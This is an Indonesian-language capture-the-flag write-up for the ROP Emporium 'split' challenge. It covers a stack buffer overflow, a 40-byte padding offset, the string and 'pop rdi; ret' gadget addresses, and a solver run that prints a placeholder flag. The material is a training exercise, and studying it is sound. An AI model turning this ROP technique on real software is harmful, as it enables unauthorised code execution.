# split-writeup

# step by step exploit

langsung analisis menggunakan gdb. dan jalankan info functions untuk melihat daftar fungsi yang tersedia.

fungsi :

- main
- pwnme
- usefulFunction

pada fungsi main tidak ada apa apa selain memanggil pwnme

fungsi pwnme memiliki kerentanan buffer overflow karena ia menyediakan fungsi read yang akan membaca input sebanyak **0x60** sedangkan ukuran buffer di stack hanya sekitar **0x20**. 

```Assembly
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x20
   -------------------....-     ---    ---------
   0x0000000000400723 <+59>:    mov    edx,0x60
   0x0000000000400728 <+64>:    mov    rsi,rax
   0x000000000040072b <+67>:    mov    edi,0x0
   0x0000000000400730 <+72>:    call   0x400590 <read@plt>
```
maka jika diperkirakan , posisi return address selalu ada diatas saved rbp. dan saved rbp selalu ada di atas buffer. ukuran saved rbp adalah 8 byte maka padding yang diperlukan untuk sampai ke return address adalah **0x20 + 8 = 0x28** sekitar 40 byte jika dalam desimal.   

dengan kerentanan ini aku bisa menimpa return address dan mengganti isinya sesuka hati. sesuai instruksi dari rop emporium, aku akan melakukan rop chain ke fungsi `system()`
fungsi itu tersedia di `usefulFunction()`

```Assembly
pwndbg> disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret
```

alamat program saat memanggil system() adalah **0x000000000040074b** atau bisa disederhanakan : `0x40074b`  
info ini akan berguna nanti.

selanjutnya adalah mencari alamat string **/bin/cat flag.txt**. karena rop emporium mengatakan bahwa string itu sudah ada di binary akan lebih mudah mencarinya. 

ada 2 opsi , bisa cari gunakan rabin2 -z atau gdb. aku contohkan keduanya.

- leak string address with Rabin2
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(split)
└> rabin2 -z split
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

address yang digunakan adalah virtual address (vaddr) . maka jelas sekali di baris paling bawah ada string itu. alamat string : `0x601060`

- leak string address with gdb


note : pasang breakpoint dimanapun lalu jalankan sebelum melakukan search 
```
pwndbg> search '/bin/cat flag.txt'
Searching for byte: b'/bin/cat flag.txt'
split           0x601060 '/bin/cat flag.txt'
```

sama kan address nya juga `0x601060` disini

terakhir adalah mencari gadget untuk memasukkan string ke dalam fungsi system. hal itu bisa dilakukan oleh gadget pop rdi dan ret.

gadget itu bisa dicari dengan tools ROPgadget :

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(split)
└> ROPgadget --binary ./split | grep "rdi"
0x0000000000400288 : loope 0x40025a ; sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
0x00000000004007c3 : pop rdi ; ret
0x000000000040028a : sar dword ptr [rdi - 0x5133700c], 0x1d ; retf 0xe99e
```

aku akan menggunakan 0x00000000004007c3 : pop rdi ; ret , karena itu adalah gadget yang bersih, hanya pop rdi lalu ret. tanpa instruksi random lain.
gadget addr : `0x4007c3`

hasil analisis
- padding offset
- system address
- gadget address
- string address

setelah mendapatkan ke empat info itu aku membuat [skrip python ini](solver.py) dan menjalankannya untuk mendapatkan flag

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(split)
└> python3 solver.py
[*] '/home/rotalactf/reno/pwn/rop-emporium/split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './split': pid 8951
[*] Switching to interactive mode
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
```

gokil 

